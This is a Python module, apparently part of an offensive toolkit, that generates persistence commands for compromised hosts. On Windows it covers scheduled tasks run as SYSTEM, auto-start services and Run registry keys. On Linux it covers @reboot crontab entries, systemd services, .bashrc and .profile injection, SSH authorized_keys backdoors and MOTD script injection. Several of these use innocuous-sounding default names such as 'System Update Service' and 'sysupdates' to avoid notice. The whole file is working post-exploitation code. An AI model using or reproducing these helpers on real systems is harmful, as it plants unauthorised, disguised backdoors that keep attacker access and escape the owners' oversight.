"""Helpers to craft persistence commands for remote runners.

Windows: scheduled tasks, services, registry run keys.
Linux:   crontab, systemd user service, bashrc/profile, SSH authorized_keys.
"""

from __future__ import annotations

from pathlib import PureWindowsPath

__all__ = [
    "schtask_command",
    "service_command",
    "runkey_command",
    "crontab_command",
    "systemd_user_service",
    "bashrc_persistence",
    "ssh_authorized_key",
    "motd_persistence",
]

def schtask_command(
    name: str, cmd: str, *, trigger: str = "ONLOGON", user: str | None = None
) -> str:
    target_user = f"/RU {user}" if user else "/RU SYSTEM"
    return " ".join(
        [
            "schtasks /Create /F",
            f"/SC {trigger}",
            f"/TN {name}",
            f'/TR "{cmd}"',
            target_user,
        ]
    )

def service_command(
    name: str, bin_path: str, *, display_name: str | None = None
) -> str:
    disp = display_name or name
    sanitized = PureWindowsPath(bin_path)
    return " ".join(
        [
            "sc create",
            name,
            f'binPath= "{sanitized}"',
            f'DisplayName= "{disp}"',
            "start= auto",
        ]
    )

def runkey_command(name: str, value: str, *, hive: str = "HKCU") -> str:
    key = rf"{hive}\Software\Microsoft\Windows\CurrentVersion\Run"
    return rf'reg add "{key}" /v "{name}" /t REG_SZ /d "{value}" /f'

def crontab_command(
    cmd: str,
    *,
    schedule: str = "@reboot",
    user: str = "",
) -> list[str]:
    """Return commands to install a Linux crontab persistence entry.

    If *user* is given, writes to ``/etc/cron.d/`` with an explicit user
    field (requires root).  Otherwise uses the current user's crontab.

    Args:
        schedule: Cron schedule string, e.g. ``@reboot`` or ``* * * * *``.
    """
    if user:
        entry = f"{schedule} {user} {cmd}"
        return [f"echo '{entry}' | tee -a /etc/cron.d/sysupdates"]
    return [f"(crontab -l 2>/dev/null; echo '{schedule} {cmd}') | crontab -"]

def systemd_user_service(
    name: str,
    exec_start: str,
    *,
    description: str = "System Update Service",
    restart: str = "always",
    system_wide: bool = False,
) -> list[str]:
    """Return commands to install a persistent systemd service.

    Args:
        name: Service unit name (without ``.service`` suffix).
        exec_start: Command to run (full path recommended).
        system_wide: If True, installs to ``/etc/systemd/system/`` (requires root).
            Otherwise installs as a user service in ``~/.config/systemd/user/``.
    """
    unit_dir = "/etc/systemd/system" if system_wide else "~/.config/systemd/user"
    enable_cmd = "systemctl enable" if system_wide else "systemctl --user enable"
    start_cmd = "systemctl start" if system_wide else "systemctl --user start"
    daemon_reload = (
        "systemctl daemon-reload" if system_wide else "systemctl --user daemon-reload"
    )

    unit_content = (
        f"[Unit]\\nDescription={description}\\n\\n"
        f"[Service]\\nExecStart={exec_start}\\nRestart={restart}\\n\\n"
        f"[Install]\\nWantedBy=default.target"
    )
    return [
        f"mkdir -p {unit_dir}",
        f"printf '{unit_content}' > {unit_dir}/{name}.service",
        daemon_reload,
        f"{enable_cmd} {name}",
        f"{start_cmd} {name}",
    ]

def bashrc_persistence(cmd: str, *, profile: bool = False) -> list[str]:
    """Return commands to append a persistent entry to ``.bashrc`` or ``.profile``.

    Args:
        profile: If True, also appends to ``~/.profile`` for login shells.
    """
    targets = ["~/.bashrc"]
    if profile:
        targets.append("~/.profile")
    return [f"echo '{cmd}' >> {t}" for t in targets]

def ssh_authorized_key(public_key: str, *, user_home: str = "~") -> list[str]:
    """Return commands to install an SSH public key for passwordless access."""
    return [
        f"mkdir -p {user_home}/.ssh",
        f"chmod 700 {user_home}/.ssh",
        f"echo '{public_key}' >> {user_home}/.ssh/authorized_keys",
        f"chmod 600 {user_home}/.ssh/authorized_keys",
    ]

def motd_persistence(cmd: str) -> list[str]:
    """Return commands to inject persistence via ``/etc/update-motd.d/`` (requires root)."""
    return [
        "mkdir -p /etc/update-motd.d",
        f"printf '#!/bin/sh\\n{cmd}\\n' > /etc/update-motd.d/99-sysinfo",
        "chmod +x /etc/update-motd.d/99-sysinfo",
    ]
